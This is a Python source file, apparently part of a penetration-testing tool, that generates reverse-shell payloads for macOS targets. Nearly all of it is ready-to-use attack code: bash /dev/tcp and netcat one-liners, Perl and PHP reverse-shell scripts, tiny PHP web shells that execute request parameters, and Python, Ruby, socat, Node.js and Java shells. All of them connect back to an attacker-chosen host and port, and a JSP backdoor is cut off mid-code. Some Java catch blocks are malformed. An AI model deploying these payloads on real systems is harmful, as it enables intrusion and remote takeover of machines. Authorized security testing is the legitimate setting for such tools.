from core.core import *
import sys
class reverse_mac():
	def __init__(self,lport='',lhost='',shell='',payload=''):
		self.shell=shell
		self.lhost=lhost
		self.lport=lport
		self.payload=payload

	def main(self):
		payloads=['all','python','python3','bash','netcat','c','c#','haskell','perl','php','ruby','socat','nodejs','java','javascript','telnet','zsh','golang','vlang','awk','dart']

		print(f'{TerminalColor.Orange}######## MAC ########{TerminalColor.Reset}')
		if not self.payload in payloads:
			print(f'{TerminalColor.Red}Invalid payload{TerminalColor.Reset}')

		if self.payload=='all' or self.payload=='python' or self.payload=='python3':
			print(self.python())
		if self.payload=='all' or self.payload=='bash':
			print(self.bash())
		if self.payload=='all' or self.payload=='netcat':
			print(self.netcat())
		if self.payload=='all' or self.payload=='c' or self.payload=='c#':
			print(self.c())
		if self.payload=='all' or self.payload=='haskell':
			print(self.haskell())
		if self.payload=='all' or self.payload=='perl':
			print(self.perl())
		if self.payload=='all' or self.payload=='php':
			print(self.php())
		if self.payload=='all' or self.payload=='ruby':
			print(self.ruby())
		if self.payload=='all' or self.payload=='socat':
			print(self.socat())
		if self.payload=='all' or self.payload=='nodejs':
			print(self.nodejs())
		if self.payload=='all' or self.payload=='java':
			print(self.java())
		if self.payload=='all' or self.payload=='javascript':
			print(self.javascript())
		if self.payload=='all' or self.payload=='telnet':
			print(self.telnet())
		if self.payload=='all' or self.payload=='zsh':
			print(self.zsh())
		if self.payload=='all' or self.payload=='golang':
			print(self.golang())
		if self.payload=='all' or self.payload=='vlang':
			print(self.vlang())
		if self.payload=='all' or self.payload=='awk':
			print(self.awk())
		if self.payload=='all' or self.payload=='dart':
			print(self.dart())



	def bash(self):
		return f'''
{TerminalColor.Orange}#BASH i
{TerminalColor.Green}{self.shell}{TerminalColor.Cyan} {TerminalColor.Cyan}-i >& /dev/tcp/{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}/{TerminalColor.Green}{self.lport}{TerminalColor.Cyan} 0>&1

{TerminalColor.Orange}#BASH 196
{TerminalColor.Cyan}0<&196;exec 196<>/dev/tcp/{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}/{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}; {TerminalColor.Green}{self.shell}{TerminalColor.Cyan} <&196 >&196 2>&196

{TerminalColor.Orange}#BASH READ LINE
{TerminalColor.Cyan}exec 5<>/dev/tcp/{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}/{TerminalColor.Green}{self.lport}{TerminalColor.Cyan};cat <&5 | while read line; do $line 2>&5 >&5; done

{TerminalColor.Orange}#BASH 5
{TerminalColor.Cyan}{TerminalColor.Green}{self.shell} {TerminalColor.Cyan}-i 5<> /dev/tcp/{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}/{TerminalColor.Green}{self.lport}{TerminalColor.Cyan} 0<&5 1>&5 2>&5

{TerminalColor.Orange}#BASH UDP
{TerminalColor.Cyan}{TerminalColor.Green}{self.shell}{TerminalColor.Cyan} -i >& /dev/udp/{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}/{TerminalColor.Green}{self.lport} {TerminalColor.Cyan}0>&1


		'''

	def netcat(self):
		return f'''
{TerminalColor.Orange}#NC MKFIFO
{TerminalColor.Cyan}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{TerminalColor.Green}{self.shell} {TerminalColor.Cyan}-i 2>&1|nc {TerminalColor.Green}{self.lhost} {self.lport}{TerminalColor.Cyan} >/tmp/f

{TerminalColor.Orange}#NC -e
{TerminalColor.Cyan}nc {TerminalColor.Green}{self.lhost} {self.lport}{TerminalColor.Cyan} -e {TerminalColor.Green}{self.shell}{TerminalColor.Cyan}

{TerminalColor.Orange}#BUSYBOX NC -e
{TerminalColor.Cyan}busybox nc {TerminalColor.Green}{self.lhost} {self.lport}{TerminalColor.Cyan} -e {TerminalColor.Green}{self.shell}{TerminalColor.Cyan}

{TerminalColor.Orange}#NC -c
{TerminalColor.Cyan}nc -c {TerminalColor.Green}{self.shell} {self.lhost} {self.lport}{TerminalColor.Cyan}

{TerminalColor.Orange}#NCAT -e
{TerminalColor.Cyan}ncat {TerminalColor.Green}{self.lhost} {self.lport}{TerminalColor.Cyan} -e {TerminalColor.Green}{self.shell}{TerminalColor.Cyan}

{TerminalColor.Orange}#NCAT UDP
{TerminalColor.Cyan}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{TerminalColor.Green}{self.shell}{TerminalColor.Cyan} -i 2>&1|ncat -u {TerminalColor.Green}{self.lhost} {self.lport}{TerminalColor.Cyan} >/tmp/f

{TerminalColor.Orange}#RUSTCAT
{TerminalColor.Cyan}rcat {TerminalColor.Green}{self.lhost} {self.lport}{TerminalColor.Cyan} -r {TerminalColor.Green}{self.shell}{TerminalColor.Cyan}


		'''

	def c(self):
		return f'''
{TerminalColor.Orange}#C
{TerminalColor.Cyan}#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void)'''+'''{'''+f'''
    int port = {TerminalColor.Green}{self.lport}{TerminalColor.Cyan};
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);'''+'''

    char * const argv[] = {"'''+f'''{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}'''+'''", NULL};
    execve("sh", argv, NULL);

    return 0;       
}'''


	def haskell(self):
		return f'''
{TerminalColor.Orange}#HASKELL #1
{TerminalColor.Cyan}module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {TerminalColor.Green}{self.shell} {TerminalColor.Cyan}-i 2>&1 | nc {TerminalColor.Green}{self.lhost} {self.lport}{TerminalColor.Cyan} >/tmp/f"

		'''

	def perl(self):
		return f'''
{TerminalColor.Orange}#PERL
{TerminalColor.Cyan}perl -e 'use Socket;$i="{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}";$p={TerminalColor.Green}{self.lport}{TerminalColor.Cyan};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))'''+'''{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("'''+f'''{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}'''+''' -i");};'

'''+f'''
{TerminalColor.Orange}#PERL NO SH
{TerminalColor.Cyan}perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}:{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

{TerminalColor.Orange}#PERL PENTESTMONKEY
{TerminalColor.Cyan}#!/usr/bin/perl -w

use strict;
use Socket;
use FileHandle;
use POSIX;
my $VERSION = "1.0";

my $ip = '{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}';
my $port = {TerminalColor.Green}{self.lport}{TerminalColor.Cyan};

my $daemon = 1;
my $auth   = 0; # 0 means authentication is disabled and any 
my $authorised_client_pattern = qr(^127\\.0\\.0\\.1$);

my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";

$0 = "[httpd]";
'''+'''
if (defined($ENV{'REMOTE_ADDR'})) {
	cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");

	if ($auth) {
		unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
			cgiprint("ERROR: Your client isn't authorised to view this page");
			cgiexit();
		}
	}
} elsif ($auth) {
	cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
	cgiexit(0);
}

# Background and dissociate from parent process if required
if ($daemon) {
	my $pid = fork();
	if ($pid) {
		cgiexit(0); # parent exits
	}

	setsid();
	chdir('/');
	umask(0);
}

socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
	cgiprint("Sent reverse shell to $ip:$port");
	cgiprintpage();
} else {
	cgiprint("Couldn't open reverse shell to $ip:$port: $!");
	cgiexit();	
}

open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
$ENV{'HISTFILE'} = '/dev/null';
system("w;uname -a;id;pwd");
exec({"'''+f'''{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}'''+'''"} ($fake_process_name, "-i"));

sub cgiprint {
	my $line = shift;
	$line .= "<p>\\n";
	$global_page .= $line;
}

# Wrapper around exit
sub cgiexit {
	cgiprintpage();
	exit 0; # 0 to ensure we don't give a 500 response.
}

sub cgiprintpage {
	print "Content-Length: " . length($global_page) . "\\r
Connection: close\\r
Content-Type: text\\/html\\r\\n\\r\\n" . $global_page;
}

		'''

	def php(self):
		return f'''
{TerminalColor.Orange}#PHP PENTESTMONKEY
{TerminalColor.Cyan}<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}';
$port = {TerminalColor.Green}{self.lport}{TerminalColor.Cyan};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; {TerminalColor.Green}{self.shell}{TerminalColor.Cyan} -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork'))'''+''' {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\\n";
	}
}

?>'''+f'''

{TerminalColor.Orange}#PHP IVAN SINCEK
{TerminalColor.Cyan}<?php
class Shell '''+'''{
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = 'sh';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';'''+f'''
// change the host address and/or port number as necessary
$sh = new Shell('{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}', {TerminalColor.Green}{self.lport}{TerminalColor.Cyan});
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>

{TerminalColor.Orange}#PHP CMD
{TerminalColor.Cyan}<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))'''+'''
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
'''+f'''

{TerminalColor.Orange}#PHP CMD 2
{TerminalColor.Cyan}<?php if(isset($_REQUEST['cmd']))'''+'''{ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>'''+f'''

{TerminalColor.Orange}#PHP CMD SMALL
{TerminalColor.Cyan}<?=`$_GET[0]`?>

{TerminalColor.Orange}#PHP EXEC
{TerminalColor.Cyan}php -r '$sock=fsockopen("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan});exec("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan} <&3 >&3 2>&3");'

{TerminalColor.Orange}#PHP SHELL_EXEC
{TerminalColor.Cyan}php -r '$sock=fsockopen("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan});shell_exec("{TerminalColor.Green}{self.shell} {TerminalColor.Cyan}<&3 >&3 2>&3");'

{TerminalColor.Orange}#PHP SYSTEM
{TerminalColor.Cyan}php -r '$sock=fsockopen("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan});system("{TerminalColor.Green}{self.shell} {TerminalColor.Cyan}<&3 >&3 2>&3");'

{TerminalColor.Orange}#PHP PASSTHRU
{TerminalColor.Cyan}php -r '$sock=fsockopen("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan});passthru("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan} <&3 >&3 2>&3");'

{TerminalColor.Orange}#PHP`
{TerminalColor.Cyan}php -r '$sock=fsockopen("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan});`{TerminalColor.Green}{self.shell}{TerminalColor.Cyan} <&3 >&3 2>&3`;'

{TerminalColor.Orange}#PHP popen
{TerminalColor.Cyan}php -r '$sock=fsockopen("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan});popen("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan} <&3 >&3 2>&3", "r");'

{TerminalColor.Orange}#PHP PROC_OPEN
{TerminalColor.Cyan}php -r '$sock=fsockopen("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan});$proc=proc_open("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'


		'''

	def python(self):
		return f'''
{TerminalColor.Orange}#PYTHON #1
{TerminalColor.Cyan}export RHOST="{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}";export RPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}")'

{TerminalColor.Orange}#PYTHON #2
{TerminalColor.Cyan}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}")'

{TerminalColor.Orange}#PYTHON3 #1
{TerminalColor.Cyan}export RHOST="{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}";export RPORT={TerminalColor.Green}{self.lport}{TerminalColor.Cyan};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}")'

{TerminalColor.Orange}#PYTHON3 #2
{TerminalColor.Cyan}python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}")'

{TerminalColor.Orange}#PYTHON3 SHORTEST
{TerminalColor.Cyan}python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}")'

		'''

	def ruby(self):
		return f'''
{TerminalColor.Orange}#RUBY #1
{TerminalColor.Cyan}ruby -rsocket -e'spawn("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}",[:in,:out,:err]=>TCPSocket.new("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}))'

{TerminalColor.Orange}#RUBY NO SH
{TerminalColor.Cyan}ruby -rsocket -e'exit if fork;c=TCPSocket.new("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}","{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}");loop'''+'''{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}' '''+f'''

		'''

	def socat(self):
		return f'''
{TerminalColor.Orange}#SOCAT #1
{TerminalColor.Cyan}socat TCP:{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}:{TerminalColor.Green}{self.lport}{TerminalColor.Cyan} EXEC:{TerminalColor.Green}{self.shell}

{TerminalColor.Orange}#SOCAT #2 (TTY)
{TerminalColor.Cyan}socat TCP:{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}:{TerminalColor.Green}{self.lport} {TerminalColor.Cyan}EXEC:'{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}',pty,stderr,setsid,sigint,sane

		'''

	def nodejs(self):
		return f'''
{TerminalColor.Orange}#NODEJS
{TerminalColor.Cyan}require('child_process').exec('nc -e {TerminalColor.Green}{self.shell} {self.lhost} {self.lport}{TerminalColor.Cyan}')

{TerminalColor.Orange}#NODEJS #2
{TerminalColor.Cyan}(function()'''+'''{
    var net = require("net"),
        cp = require("child_process"),'''+f'''
        sh = cp.spawn("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}", []);
    var client = new net.Socket();
    client.connect({TerminalColor.Green}{self.lport}{TerminalColor.Cyan}, "{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}", function()'''+'''{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();

		'''

	def java(self):
		return f'''
{TerminalColor.Orange}#JAVA #1
{TerminalColor.Cyan}public class shell '''+'''{
    public static void main(String[] args) {
        Process p;
        try {'''+f'''
            p = Runtime.getRuntime().exec("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan} -c $@|{TerminalColor.Green}{self.shell} {TerminalColor.Cyan}0 echo {TerminalColor.Green}{self.shell}{TerminalColor.Cyan} -i >& /dev/tcp/{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}/{TerminalColor.Green}{self.lport}{TerminalColor.Cyan} 0>&1");
            p.waitFor();
            p.destroy();'''+'''
        } catch (Exception e) {}
    }
}'''+f'''

{TerminalColor.Orange}#JAVA #2
{TerminalColor.Cyan}public class shell '''+'''{
    public static void main(String[] args) {'''+f'''
        ProcessBuilder pb = new ProcessBuilder("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}", "-c", "$@| {TerminalColor.Green}{self.shell} {TerminalColor.Cyan}-i >& /dev/tcp/{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}/{TerminalColor.Green}{self.lport}{TerminalColor.Cyan} 0>&1")
            .redirectErrorStream(true);
        try'''+''' {
            Process p = pb.start();
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}'''+f'''

{TerminalColor.Orange}#JAVA #3
{TerminalColor.Cyan}import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class shell '''+'''{
    public static void main(String[] args) {'''+f'''
        String host = "{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}";
        int port = {TerminalColor.Green}{self.lport}{TerminalColor.Cyan};
        String cmd = "{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}";'''+'''
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {}
    }
}'''+f'''

{TerminalColor.Orange}#JAVA WEB
{TerminalColor.Cyan}static class StreamConnector extends Thread '''+'''
{
        InputStream is;
        OutputStream os;
        StreamConnector(InputStream is, OutputStream os)
        {
                this.is = is;
                this.os = os;
        }
        public void run()
        {
                BufferedReader isr = null;
                BufferedWriter osw = null;
                try
                {
                        isr = new BufferedReader(new InputStreamReader(is));
                        osw = new BufferedWriter(new OutputStreamWriter(os));
                        char buffer[] = new char[8192];
                        int lenRead;
                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)
                        {
                                osw.write(buffer, 0, lenRead);
                                osw.flush();
                        }
                }
                catch (Exception ioe)
                try
                {
                        if(isr != null) isr.close();
                        if(osw != null) osw.close();
                }
                catch (Exception ioe)
        }
}
%>

<h1>JSP Backdoor Reverse Shell</h1>

<form method="post">
IP Address
<input type="text" name="ipaddress" size=30>
Port
<input type="text" name="port" size=10>
<input type="submit" name="Connect" value="Connect">
</form>
<p>
<hr>

<%
String ipAddress = request.getParameter("ipaddress");
String ipPort = request.getParameter("port");
if(ipAddress != null && ipPort != null)
{
        Socket sock = null;
        try
        {
                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());
                Runtime rt = Runtime.getRuntime();
                Process proc = rt.exec("cmd.exe");
                StreamConnector outputConnector =
                        new StreamConnector(proc.getInputStream(),
                                          sock.getOutputStream());
                StreamConnector inputConnector =
                        new StreamConnector(sock.getInputStream(),
